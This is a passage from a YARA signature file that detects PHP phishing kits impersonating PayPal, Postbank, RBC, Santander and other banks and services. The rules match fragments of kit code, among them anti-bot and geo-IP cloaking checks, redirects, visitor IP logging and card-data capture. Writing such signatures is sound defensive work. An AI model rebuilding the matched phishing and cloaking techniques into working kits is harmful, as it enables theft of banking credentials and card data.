        $trigger and PR01021
}

rule php_phishing_paypal_014 : phishing
{
    strings:
        $trigger = "&Rho;ay&Rho;al"
    condition:
        $trigger and PR00042
}

rule php_phishing_paypal_015 : phishing
{
    strings:
        $trigger = ".html?cmd=_home&locale.x=en_US\");"
    condition:
        $trigger and PR00273
}

private rule PR05838 : trigger
{
    strings:
        $ps0 = "include('../antibots.php')"
    condition:
        $ps0
}

rule php_phishing_paypal_016 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR05838
}

private rule PR05839 : trigger
{
    strings:
        $ps0 = "your bank account</title>"
    condition:
        $ps0
}

rule php_phishing_paypal_017 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05839
}

rule php_phishing_paypal_018 : phishing
{
    strings:
        $trigger = "<p>Please complete verification steps to restore your credit cards</p>"
    condition:
        $trigger and PR00493 and PR00373
}

rule php_phishing_paypal_019 : phishing
{
    strings:
        $trigger = "header(\"Location: signin.php?locale.x=\".substr($"
    condition:
        $trigger
}

rule php_phishing_paypal_019_02 : phishing
{
    strings:
        $trigger = ".md5(rand(1,999)).\"&verification_dispatch=\".base64_encode(md5(rand("
    condition:
        $trigger and PR00273
}

rule php_phishing_paypal_020 : phishing
{
    strings:
        $trigger = "CURLOPT_URL, 'https://history.paypal.com"
    condition:
        $trigger
}

rule php_phishing_paypal_021 : phishing
{
    strings:
        $trigger = "email\\\":\\\"service@paypalid.com\\\"}]"
    condition:
        $trigger and PR01401
}

private rule PR05840 : trigger
{
    strings:
        $ps0 = "<title><?php echo $lg_sign['title']?></title>"
    condition:
        $ps0
}

rule php_phishing_paypal_022 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00281 and PR05840
}

rule php_phishing_paypal_023 : phishing
{
    strings:
        $trigger = "if (!xENCRYPTION) {$"
    condition:
        $trigger and PR00042
}

rule php_phishing_paypal_024 : phishing
{
    strings:
        $trigger = "zpaypal_'.$_SERVER['SERVER_NAME'].'_'.@date"
    condition:
        $trigger
}

private rule PR05841 : trigger
{
    strings:
        $ps0 = "@session_name('zPayPal_"
    condition:
        $ps0
}

rule php_phishing_paypal_025 : phishing
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR05841 and PR02181
}

private rule PR05842 : trigger
{
    strings:
        $ps0 = "%3C%21%44%4F%43%54%59%50%45"
    condition:
        $ps0
}

rule php_phishing_paypal_026 : phishing
{
    strings:
        $trigger = "javascript"
    condition:
        $trigger and PR00231 and PR05842 and PR05587
}

rule php_phishing_paypal_027 : phishing
{
    strings:
        $trigger = "\xce\xa1\xd0\xb0y\xce\xa1\xd0\xb0I"
    condition:
        $trigger and PR00042
}

rule php_phishing_paypal_028 : phishing
{
    strings:
        $trigger = "<h1 class=\"headerText\">Open the PayPal app</h1>"
    condition:
        $trigger and PR00042 and PR00278
}

private rule PR05843 : trigger
{
    strings:
        $ps0 = "anti"
    condition:
        $ps0
}

rule php_phishing_paypal_029 : phishing
{
    strings:
        $trigger = "track(\"Login page\", $_SESSION"
    condition:
        $trigger and PR02534 and PR05843
}

private rule PR05844 : trigger
{
    strings:
        $ps0 = "Q29uc3VtZXIgYWR2aXNvcnkgLSBQYXlQYWwgU"
    condition:
        $ps0
}

rule php_phishing_paypal_029_02 : phishing
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR05844
}

rule php_phishing_paypal_029_03 : phishing
{
    strings:
        $trigger = "<title>Paypal : Summary"
    condition:
        $trigger
}

rule php_phishing_paypal_029_04 : phishing
{
    strings:
        $trigger = "[CryptoRhythm]"
    condition:
        $trigger and PR00301 and PR02480
}

rule php_phishing_paypal_029_05 : phishing
{
    strings:
        $trigger = "\">Setup your scam page<"
    condition:
        $trigger and PR00371 and PR00050
}

rule php_phishing_paypal_030 : phishing
{
    strings:
        $trigger = "\\x20PayPaI"
    condition:
        $trigger and PR00042
}

rule php_phishing_paypal_031 : phishing
{
    strings:
        $trigger = "PayPal Help Center"
    condition:
        $trigger and PR00042
}

rule php_phishing_pheonix_001 : phishing
{
    strings:
        $trigger = "// Pheonix | Cannabis"
    condition:
        $trigger and PR02208
}

rule php_phishing_postbank_001 : phishing
{
    strings:
        $trigger = "<title>Postbank Online-Banking"
    condition:
        $trigger
}

rule php_phishing_postbank_001_002 : phishing
{
    strings:
        $trigger = "<title>Postbank Online Banking"
    condition:
        $trigger
}

rule php_phishing_postbank_002 : phishing
{
    strings:
        $trigger = "header(\"Location: https://banking.postbank.de"
    condition:
        $trigger
}

rule php_phishing_rackspace_001 : phishing
{
    strings:
        $trigger = "document.cookie = \"rsea_cust=1; expires=\"+next_month+\"; path=/; domain=.rackspace.com"
    condition:
        $trigger and PR00281 and PR00247
}

rule php_phishing_rackspace_002 : phishing
{
    strings:
        $trigger = "<title>&#82;&#97;&#99;&#107;&#115;&#112;&#97;&#99;&#101;&#32;&#87;&#101;&#98;&#109;&#97;&#105;&#108;&#58;&#32;&#72;&#111;&#115;&#116;&#101;&#100;&#32;&#69;&#109;"
    condition:
        $trigger
}

rule php_phishing_rbc_001 : phishing
{
    strings:
        $trigger = "header(\"Location: http://www.rbc.com/"
    condition:
        $trigger
}

private rule PR05845 : trigger
{
    strings:
        $ps0 = ">The RBC Wallet is now available on all Android phones<"
    condition:
        $ps0
}

rule php_phishing_RBCwallet_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05845
}

private rule PR05846 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"REFRESH"
    condition:
        $ps0
}

rule php_phishing_RBCwallet_002 : phishing
{
    strings:
        $trigger = ">RBC Royal Bank"
    condition:
        $trigger and PR05846
}

rule php_phishing_rbfcu_001 : phishing
{
    strings:
        $trigger = "<title>RBFCU - Sign In</title>"
    condition:
        $trigger
}

private rule PR05847 : trigger
{
    strings:
        $ps0 = "device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)"
    condition:
        $ps0
}

rule php_phishing_redirect_001 : phishing
{
    strings:
        $trigger = "window.location = \"./rand.php\";"
    condition:
        $trigger and PR05847
}

private rule PR05848 : trigger
{
    strings:
        $ps0 = " = substr(md5($random), 0,"
    condition:
        $ps0
}

rule php_phishing_redirect_002 : phishing
{
    strings:
        $trigger = "header("
    condition:
        $trigger and PR04149 and PR05848
}

private rule PR05849 : trigger
{
    strings:
        $ps0 = "rand(99"
    condition:
        $ps0
}

rule php_phishing_redirect_003 : phishing
{
    strings:
        $trigger = "?<?php echo $"
    condition:
        $trigger and PR00050 and PR01613 and PR05482 and PR05849
}

rule php_phishing_redirect_004 : phishing
{
    strings:
        $trigger = "fwrite($id, $conteudo, strlen($conteudo"
    condition:
        $trigger and PR02741 and PR03964
}

private rule PR05850 : trigger
{
    strings:
        $ps0 = "fwrite($novoarquivo,$d .\" - \".$ip.\" - \".$browser.\""
    condition:
        $ps0
}

rule php_phishing_redirect_005 : phishing
{
    strings:
        $trigger = "_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR05452 and PR05850
}

private rule PR05851 : trigger
{
    strings:
        $ps0 = "./<?php echo "
    condition:
        $ps0
}

rule php_phishing_redirect_006 : phishing
{
    strings:
        $trigger = "rand(99"
    condition:
        $trigger and PR00050 and PR01613 and PR05482 and PR05851
}

private rule PR05852 : trigger
{
    strings:
        $ps0 = "function Anon_http($srv, $usr, $url, "
    condition:
        $ps0
}

rule php_phishing_redirect_007 : phishing
{
    strings:
        $trigger = "top.location"
    condition:
        $trigger and PR05852 and PR00050
}

rule php_phishing_redirect_008 : phishing
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR05572
}

private rule PR05853 : trigger
{
    strings:
        $ps0 = "header('location:'.$scam.$i);"
    condition:
        $ps0
}

rule php_phishing_redirect_009 : phishing
{
    strings:
        $trigger = "file_exists"
    condition:
        $trigger and PR05853
}

rule php_phishing_redirect_010 : phishing
{
    strings:
        $trigger = "$x=md5(microtime());$xx=sha1(microtime());"
    condition:
        $trigger
}

private rule PR05854 : trigger
{
    strings:
        $ps0 = "foreach ($Botname as $word"
    condition:
        $ps0
}

rule php_phishing_redirect_011 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05854
}

rule php_phishing_redirect_012 : phishing
{
    strings:
        $trigger = " <aziz>\" . \"\\r\\n\";"
    condition:
        $trigger and PR00042 and PR00278
}

rule php_phishing_redirect_013 : phishing
{
    strings:
        $trigger = "fwrite($file,$ip.\" || \".gmdate (\"Y-n-d\").\" ----> \".gmdate (\"H:i:s\").\"\\n\");"
    condition:
        $trigger and PR00273
}

rule php_phishing_redirect_014 : phishing
{
    strings:
        $trigger = "|Data Of berithday = <b><font color='green'>$DOB"
    condition:
        $trigger and PR00507
}

private rule PR05855 : trigger
{
    strings:
        $ps0 = "function recurse_copy($JOkEr7"
    condition:
        $ps0
}

rule php_phishing_redirect_015 : phishing
{
    strings:
        $trigger = "_SERVER['REMOTE_ADDR"
    condition:
        $trigger and PR05855 and PR02741
}

rule php_phishing_redirect_017 : phishing
{
    strings:
        $trigger = "header(\"location: login.php?cmd=login_submit&id="
    condition:
        $trigger
}

rule php_phishing_redirect_018 : phishing
{
    strings:
        $trigger = "echo(\"loading To PayPal"
    condition:
        $trigger and PR00042
}

private rule PR05856 : trigger
{
    strings:
        $ps0 = "action=\"<?php echo \"$webscr/?cmd=_login-submit"
    condition:
        $ps0
}

rule php_phishing_redirect_019 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR05856
}

private rule PR05857 : trigger
{
    strings:
        $ps0 = "$bannedIP = array(\"^"
    condition:
        $ps0
}

private rule PR05858 : trigger
{
    strings:
        $ps0 = "if (substr_count($hostname, $word) > 0) {"
    condition:
        $ps0
}

rule php_phishing_redirect_020 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR05857 and PR03964 and PR05858 and PR02741
}

rule php_phishing_redirect_021 : phishing
{
    strings:
        $trigger = "/bmo-canada-billing/"
    condition:
        $trigger and PR00538
}

private rule PR05859 : trigger
{
    strings:
        $ps0 = ".php?e=<?php echo htmlspecialchars($_GET["
    condition:
        $ps0
}

rule php_phishing_redirect_022 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"0;"
    condition:
        $trigger and PR05859
}

private rule PR05860 : trigger
{
    strings:
        $ps0 = "header(\"Location: loginprodx.php?$md5"
    condition:
        $ps0
}

rule php_phishing_redirect_024 : phishing
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR05860
}

rule php_phishing_redirect_025 : phishing
{
    strings:
        $trigger = "./index_0.html?login=\""
    condition:
        $trigger and PR00273
}

private rule PR05861 : trigger
{
    strings:
        $ps0 = "$ipArray = file(\"Bad.txt\");"
    condition:
        $ps0
}

rule php_phishing_redirect_026 : phishing
{
    strings:
        $trigger = "$domain[rand("
    condition:
        $trigger and PR00092 and PR05861
}

rule php_phishing_redirect_027 : phishing
{
    strings:
        $trigger = "?email=<?php echo $_GET['email']; ?>"
    condition:
        $trigger and PR00371 and PR00050
}

private rule PR05862 : trigger
{
    strings:
        $ps0 = "return (isset($_SERVER['HTTP_USER_AGENT'])&& preg_match('/bot|crawl|crawler|proxy|slurp|spider/i', $_SERVER['HTTP_USER_AGENT']"
    condition:
        $ps0
}

rule php_phishing_redirect_028 : phishing
{
    strings:
        $trigger = "if(!IS_BOT_CRAWLER() && !IS_BOT($ip) && $response[\"country_code\"] =="
    condition:
        $trigger and PR00371 and PR00050 and PR05862
}

rule php_phishing_redirect_029 : phishing
{
    strings:
        $trigger = "base64_encode($_SERVER['REQUEST_URI']."
    condition:
        $trigger and PR02764
}

private rule PR05863 : trigger
{
    strings:
        $ps0 = "/s.php?mesaj=$mes"
    condition:
        $ps0
}

rule php_phishing_redirect_031 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05863
}

private rule PR05864 : trigger
{
    strings:
        $ps0 = "if(in_array($geoplugin->countryCode,$whitelisted)) {"
    condition:
        $ps0
}

rule php_phishing_redirect_033 : phishing
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR05864
}

rule php_phishing_redirect_034 : phishing
{
    strings:
        $trigger = "header(\"location: loading.php?email=$email&id=$"
    condition:
        $trigger
}

rule php_phishing_redirect_035 : phishing
{
    strings:
        $trigger = "echo md5(uniqid(time()));"
    condition:
        $trigger and PR00371 and PR00050
}

private rule PR05865 : trigger
{
    strings:
        $ps0 = "://www.paypal.de-"
    condition:
        $ps0
}

rule php_phishing_redirect_036 : phishing
{
    strings:
        $trigger = "=rand("
    condition:
        $trigger and PR05865
}

rule php_phishing_redirect_037 : phishing
{
    strings:
        $trigger = "foreach ($os_array as $regex => $value)"
    condition:
        $trigger and PR05858 and PR00070 and PR02163
}

private rule PR05866 : trigger
{
    strings:
        $ps0 = "->geoplugin_countryCode"
    condition:
        $ps0
}

rule php_phishing_redirect_038 : phishing
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR"
    condition:
        $trigger and PR00273 and PR01403 and PR05866
}

private rule PR05867 : trigger
{
    strings:
        $ps0 = "fwrite($file,$_SERVER['SERVER_NAME']"
    condition:
        $ps0
}

rule php_phishing_redirect_039 : phishing
{
    strings:
        $trigger = "header($_SERVER['SERVER_PROTOCOL'] . ' 500 Internal Server Error'"
    condition:
        $trigger and PR05867
}

private rule PR05868 : trigger
{
    strings:
        $ps0 = "if(preg_match('/bot|yahoo|google"
    condition:
        $ps0
}

private rule PR05869 : trigger
{
    strings:
        $ps0 = "window.location.assign"
    condition:
        $ps0
}

rule php_phishing_redirect_040 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR05868 and PR05869 and PR00357
}

private rule PR05870 : trigger
{
    strings:
        $ps0 = "){if (!copy($"
    condition:
        $ps0
}

rule php_phishing_redirect_041 : phishing
{
    strings:
        $trigger = "md5(time());"
    condition:
        $trigger and PR05870 and PR00273
}

private rule PR05871 : trigger
{
    strings:
        $ps0 = "HTTP-EQUIV='refresh"
    condition:
        $ps0
}

private rule PR05872 : trigger
{
    strings:
        $ps0 = "}else if(preg_match('/hotmail"
    condition:
        $ps0
}

rule php_phishing_redirect_043 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05871 and PR05872
}

private rule PR05873 : trigger
{
    strings:
        $ps0 = "if (!isset($_GET['view']) && !isset($_GET["
    condition:
        $ps0
}

rule php_phishing_redirect_044 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05871 and PR05873
}

private rule PR05874 : trigger
{
    strings:
        $ps0 = "explode(PHP_EOL"
    condition:
        $ps0
}

rule php_phishing_redirect_045 : phishing
{
    strings:
        $trigger = "d{1,3}"
    condition:
        $trigger and PR05874 and PR03085 and PR02741
}

rule php_phishing_redirect_046 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR05784 and PR01403 and PR00273 and PR05256
}

private rule PR05875 : trigger
{
    strings:
        $ps0 = "window.location.hash;"
    condition:
        $ps0
}

private rule PR05876 : trigger
{
    strings:
        $ps0 = "if(strpos(gethostbyaddr(getenv("
    condition:
        $ps0
}

rule php_phishing_redirect_047 : phishing
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR05875 and PR05622 and PR05876
}

// MANUAL FIX NECESSARY
private rule PR05877 : trigger
{
    strings:
        $ps0 = "if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {"
    condition:
        $ps0
}

private rule PR05878 : trigger
{
    strings:
        $ps0 = "var userAgent = navigator.userAgent || navigator.vendor || window.opera;"
    condition:
        $ps0
}

rule php_phishing_redirect_048 : phishing
{
    strings:
        $trigger = "<body on"
        $php_phishing_redirect_048_r0 = /if\s+\(\w+\(\)\s+==\s+\"(Android|iOS|Windows\s+Phone|unknown)\"\)\s+\{\s+window.location.href\s+=\s+\"http[^}]*}/
    condition:
        $trigger and PR00371 and PR00050 and PR05877 and PR05878 and $php_phishing_redirect_048_r0
}

private rule PR05879 : trigger
{
    strings:
        $ps0 = "fopen(\"iplog"
    condition:
        $ps0
}

rule php_phishing_redirect_049 : phishing
{
    strings:
        $trigger = "curl_exec"
    condition:
        $trigger and PR01362 and PR05879
}

private rule PR05880 : trigger
{
    strings:
        $ps0 = "function delayedRedirect"
    condition:
        $ps0
}

private rule PR05881 : trigger
{
    strings:
        $ps0 = "setTimeout('delayedRedirect()"
    condition:
        $ps0
}

rule php_phishing_redirect_050 : phishing
{
    strings:
        $trigger = "<body on"
    condition:
        $trigger and PR00371 and PR00050 and PR05880 and PR05881
}

private rule PR05882 : trigger
{
    strings:
        $ps0 = "header(\"Location: $use\");"
    condition:
        $ps0
}

rule php_phishing_redirect_051 : phishing
{
    strings:
        $trigger = "$use = $urls[array_rand($urls)];"
    condition:
        $trigger and PR05882
}

private rule PR05883 : trigger
{
    strings:
        $ps0 = "document.write(unescape('%3C%68%74%6D%6C%3E%0A%20%20%20%3"
    condition:
        $ps0
}

rule php_phishing_redirect_053 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.facebook.com/\");"
    condition:
        $trigger and PR05883
}

rule php_phishing_redirect_053_02 : phishing
{
    strings:
        $trigger = ". \":https://tools.tracemyip.org/lookup/\".$ip.\":\" . $useragent . PHP_EOL, FILE_APPEND);"
    condition:
        $trigger and PR00435
}

private rule PR05884 : trigger
{
    strings:
        $ps0 = "$items = Array('https:"
    condition:
        $ps0
}

private rule PR05885 : trigger
{
    strings:
        $ps0 = "$URL = $items[array_rand($items)];"
    condition:
        $ps0
}

rule php_phishing_redirect_054 : phishing
{
    strings:
        $trigger = "header(\"Location: $URL\");"
    condition:
        $trigger and PR05884 and PR05885
}

private rule PR05886 : trigger
{
    strings:
        $ps0 = "->geoplugin_countryName"
    condition:
        $ps0
}

rule php_phishing_redirect_055 : phishing
{
    strings:
        $trigger = "getenv(\"REMOTE_ADDR"
    condition:
        $trigger and PR05886 and PR00273 and PR01403
}

private rule PR05887 : trigger
{
    strings:
        $ps0 = "];exit;}}@touch(__FILE__,"
    condition:
        $ps0
}

private rule PR05888 : trigger
{
    strings:
        $ps0 = "])?true:false):header(\""
    condition:
        $ps0
}

private rule PR05889 : trigger
{
    strings:
        $ps0 = ")){function getUrla($url){${\""
    condition:
        $ps0
}

rule php_phishing_redirect_056 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR05887 and PR05888 and PR05889
}

private rule PR05890 : trigger
{
    strings:
        $ps0 = "$email"
    condition:
        $ps0
}

private rule PR05891 : trigger
{
    strings:
        $ps0 = "(filter_var(base64_decode($_GET["
    condition:
        $ps0
}

rule php_phishing_redirect_057 : phishing
{
    strings:
        $trigger = "FILTER_VALIDATE_EMAIL"
    condition:
        $trigger and PR05890 and PR00273 and PR05891
}

private rule PR05892 : trigger
{
    strings:
        $ps0 = "date_default_timezone_set('Asia/Jakarta');"
    condition:
        $ps0
}

private rule PR05893 : trigger
{
    strings:
        $ps0 = "$scampage"
    condition:
        $ps0
}

private rule PR05894 : trigger
{
    strings:
        $ps0 = "json_decode($"
    condition:
        $ps0
}

rule php_phishing_redirect_058 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR01403 and PR05892 and PR05893 and PR05894
}

private rule PR05895 : trigger
{
    strings:
        $ps0 = "301 : 302)"
    condition:
        $ps0
}

rule php_phishing_redirect_059 : phishing
{
    strings:
        $trigger = "function Redirect($"
    condition:
        $trigger and PR05895 and PR05452 and PR01746
}

rule php_phishing_relaxbanking_001 : phishing
{
    strings:
        $trigger = "RelaxBanking"
    condition:
        $trigger and PR00042
}

private rule PR05896 : trigger
{
    strings:
        $ps0 = "<title>*RRS* BY BCTEAM 2015"
    condition:
        $ps0
}

rule php_phishing_rrb_001 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05896
}

rule php_phishing_santander_001 : phishing
{
    strings:
        $trigger = "$url=\"https://retail.santander.co.uk/EBAN_Accounts_ENS/BtoChannelDriver.ssobto?dse_operationName"
    condition:
        $trigger and PR01746
}

rule php_phishing_santander_002 : phishing
{
    strings:
        $trigger = "<title>Santander e-Banking"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_phishing_santander_003 : phishing
{
    strings:
        $trigger = "echo"
        $php_phishing_santander_003_r0 = /<\?php[\s]*echo[\s]*\"[^;]+\\x[\w]{2}[^}]+include[\s]*\"[^;]+\\x[\w]{2}[^;]+;[\s]*echo[^;]+;/
    condition:
        $trigger and PR02534 and PR00634 and $php_phishing_santander_003_r0
}

private rule PR05897 : trigger
{
    strings:
        $ps0 = "mci.gov.sa"
    condition:
        $ps0
}

rule php_phishing_saudi_post_001 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR05897
}

private rule PR05898 : trigger
{
    strings:
        $ps0 = ">As an additional security check, please confirm the following details to verify your identity.<"
    condition:
        $ps0
}

rule php_phishing_scotiabank_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05898 and PR00301
}

private rule PR05899 : trigger
{
    strings:
        $ps0 = "($details && $details->geoplugin_countryName != null)"
    condition:
        $ps0
}

rule php_phishing_script_001 : phishing
{
    strings:
        $trigger = "foreach ($os_array as $regex => $value)"
    condition:
        $trigger and PR05899 and PR00070 and PR02163
}

// MANUAL FIX NECESSARY
rule php_phishing_script_002 : phishing
{
    strings:
        $trigger = "anti"
        $php_phishing_script_002_r0 = /include[^\w][^;\n]{0,20}['\"\/]anti[^;\n]*\.php/
    condition:
        $trigger and PR02534 and $php_phishing_script_002_r0
}

private rule PR05900 : trigger
{
    strings:
        $ps0 = "if(getenv(HTTP_CLIENT_IP))"
    condition:
        $ps0
}

rule php_phishing_script_003 : phishing
{
    strings:
        $trigger = "$ip=getenv(HTTP_CLIENT_IP);"
    condition:
        $trigger and PR05900 and PR05804 and PR02179
}

private rule PR05901 : trigger
{
    strings:
        $ps0 = "$allowed_countries=array("
    condition:
        $ps0
}

private rule PR05902 : trigger
{
    strings:
        $ps0 = "function randomCha($len)"
    condition:
        $ps0
}

rule php_phishing_script_004 : phishing
{
    strings:
        $trigger = "page"
    condition:
        $trigger and PR05901 and PR05902
}

private rule PR05903 : trigger
{
    strings:
        $ps0 = "Exp: \".$_POST["
    condition:
        $ps0
}

private rule PR05904 : trigger
{
    strings:
        $ps0 = "function validate_cc_number($cc_number)"
    condition:
        $ps0
}

rule php_phishing_script_005 : phishing
{
    strings:
        $trigger = "Location:"
    condition:
        $trigger and PR05903 and PR05904
}

rule php_phishing_script_006 : phishing
{
    strings:
        $trigger = "header(\"Location: finished.html?dispatch="
    condition:
        $trigger and PR05780
}

private rule PR05905 : trigger
{
    strings:
        $ps0 = "<input type=\"submit\" value=\"$_$Click Here$_$\""
    condition:
        $ps0
}

rule php_phishing_script_007 : phishing
{
    strings:
        $trigger = "if(isset($emails)&&$count>=1)"
    condition:
        $trigger and PR00080 and PR00113 and PR05905
}

private rule PR05906 : trigger
{
    strings:
        $ps0 = "$user_agent=strtolower(getenv('HTTP_USER_AGENT'));"
    condition:
        $ps0
}

private rule PR05907 : trigger
{
    strings:
        $ps0 = "if (in_array(substr($user_agent"
    condition:
        $ps0
}

private rule PR05908 : trigger
{
    strings:
        $ps0 = "function is_mobile()"
    condition:
        $ps0
}

rule php_phishing_script_008 : phishing
{
    strings:
        $trigger = "(strpos($accept,'application/vnd.wap.xhtml+xml')!==false))"
    condition:
        $trigger and PR05906 and PR05907 and PR05908
}

rule php_phishing_script_009 : phishing
{
    strings:
        $trigger = "include('blocker.php');"
    condition:
        $trigger and PR00042
}

private rule PR05909 : trigger
{
    strings:
        $ps0 = "<title>Loading.."
    condition:
        $ps0
}

rule php_phishing_script_010 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"REFRESH\" content="
    condition:
        $trigger and PR05909
}

private rule PR05910 : trigger
{
    strings:
        $ps0 = "function getc($string)"
    condition:
        $ps0
}

rule php_phishing_script_011 : phishing
{
    strings:
        $trigger = "include('blocker.php');"
    condition:
        $trigger and PR05910
}

private rule PR05911 : trigger
{
    strings:
        $ps0 = "($v_agent == \"Mozilla/"
    condition:
        $ps0
}

rule php_phishing_script_012 : phishing
{
    strings:
        $trigger = "echo \"<!--$random_id-->\";"
    condition:
        $trigger and PR00039 and PR05911
}

rule php_phishing_script_013 : phishing
{
    strings:
        $trigger = "return symlink(readlink($source), $HtaccessSouRce);"
    condition:
        $trigger and PR02534
}

private rule PR05912 : trigger
{
    strings:
        $ps0 = "include \"../bts/anti"
    condition:
        $ps0
}

rule php_phishing_script_014 : phishing
{
    strings:
        $trigger = "header("
    condition:
        $trigger and PR05912
}

rule php_phishing_script_015 : phishing
{
    strings:
        $trigger = "(strpos($value['target'], 'google')  !== false || strpos($value['target'], 'GOOGLE')) {"
    condition:
        $trigger and PR00080
}

private rule PR05913 : trigger
{
    strings:
        $ps0 = "\";if(!empty(${$"
    condition:
        $ps0
}

private rule PR05914 : trigger
{
    strings:
        $ps0 = "\"]},FILTER_VALIDATE_EMAIL)){$"
    condition:
        $ps0
}

rule php_phishing_script_016 : phishing
{
    strings:
        $trigger = "\"]}=md5(uniqid(rand(),true));if(filter_input(INPUT_POST,\""
    condition:
        $trigger and PR05913 and PR05914
}

private rule PR05915 : trigger
{
    strings:
        $ps0 = "function recurse_copy($"
    condition:
        $ps0
}

rule php_phishing_script_017 : phishing
{
    strings:
        $trigger = "substr(str_shuffle(md5(time()"
    condition:
        $trigger and PR02741 and PR05915
}

private rule PR05916 : trigger
{
    strings:
        $ps0 = "if(isset($_SESSION[\"email\"]) && isset($_SESSION["
    condition:
        $ps0
}

private rule PR05917 : trigger
{
    strings:
        $ps0 = "header(\"location:home2.html\");"
    condition:
        $ps0
}

rule php_phishing_script_018 : phishing
{
    strings:
        $trigger = "header(\"location:index.html\");"
    condition:
        $trigger and PR05916 and PR05917
}

private rule PR05918 : trigger
{
    strings:
        $ps0 = "function os_info("
    condition:
        $ps0
}

private rule PR05919 : trigger
{
    strings:
        $ps0 = "function bankDetails($cardNumber)"
    condition:
        $ps0
}

rule php_phishing_script_020 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR05918 and PR05919 and PR01021
}

private rule PR05920 : trigger
{
    strings:
        $ps0 = "api.txt"
    condition:
        $ps0
}

private rule PR05921 : trigger
{
    strings:
        $ps0 = "$_GET['api"
    condition:
        $ps0
}

rule php_phishing_script_022 : phishing
{
    strings:
        $trigger = "ident.txt"
    condition:
        $trigger and PR00092 and PR05920 and PR05921
}

// MANUAL FIX NECESSARY
private rule PR05922 : trigger
{
    strings:
        $ps0 = "$characters[rand("
    condition:
        $ps0
}

rule php_phishing_script_023 : phishing
{
    strings:
        $trigger = "function generateRandomString($length"
        $php_phishing_script_023_r0 = /header\(.[lL]ocation:[\s]*[\w]+\.php\?[^;]+\.[\s]*generateRandomString\([\d]+\)\);/
    condition:
        $trigger and PR00431 and PR05922 and $php_phishing_script_023_r0
}

private rule PR05923 : trigger
{
    strings:
        $ps0 = "$tanitatikaram = parse_ini_file("
    condition:
        $ps0
}

rule php_phishing_script_024 : phishing
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR05923
}

private rule PR05924 : trigger
{
    strings:
        $ps0 = "if (strpos($mxhosts[0], \"google.com"
    condition:
        $ps0
}

rule php_phishing_script_025 : phishing
{
    strings:
        $trigger = "file_get_contents($file_path);"
    condition:
        $trigger and PR05924 and PR01428 and PR01021
}

private rule PR05925 : trigger
{
    strings:
        $ps0 = "<?php echo $email; ?>"
    condition:
        $ps0
}

rule php_phishing_script_027 : phishing
{
    strings:
        $trigger = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%68%65%61%64%3E%0A%0A%3C%6D%"
    condition:
        $trigger and PR05925
}

private rule PR05926 : trigger
{
    strings:
        $ps0 = "api?token='.$token.'&scam"
    condition:
        $ps0
}

rule php_phishing_script_028 : phishing
{
    strings:
        $trigger = "if (file_exists("
    condition:
        $trigger and PR05926
}

rule php_phishing_script_029 : phishing
{
    strings:
        $trigger = "<title><?php echo $domain ?> Client"
    condition:
        $trigger
}

private rule PR05927 : trigger
{
    strings:
        $ps0 = "$domain_check = '@'.strtolower($domain"
    condition:
        $ps0
}

rule php_phishing_script_029_02 : phishing
{
    strings:
        $trigger = "!== false || stripos($domain_check,"
    condition:
        $trigger and PR05927
}

private rule PR05928 : trigger
{
    strings:
        $ps0 = "include('../"
    condition:
        $ps0
}

rule php_phishing_script_030 : phishing
{
    strings:
        $trigger = "<?=$language["
    condition:
        $trigger and PR05928
}

rule php_phishing_script_031 : phishing
{
    strings:
        $trigger = "<? echo($language["
    condition:
        $trigger and PR02534
}

private rule PR05929 : trigger
{
    strings:
        $ps0 = "if($_GET['cmd'] == \"scamlist\")"
    condition:
        $ps0
}

rule php_phishing_script_033 : phishing
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR05929
}

rule php_phishing_script_034 : phishing
{
    strings:
        $trigger = "><title>(<?php echo $_SESSION["
    condition:
        $trigger
}

private rule PR05930 : trigger
{
    strings:
        $ps0 = "preg_match('/bot|crawl|slurp|"
    condition:
        $ps0
}

rule php_phishing_script_035 : phishing
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR01408 and PR05930
}

rule php_phishing_script_036 : phishing
{
    strings:
        $trigger = "BY XBALTI"
    condition:
        $trigger and PR02609
}

private rule PR05931 : trigger
{
    strings:
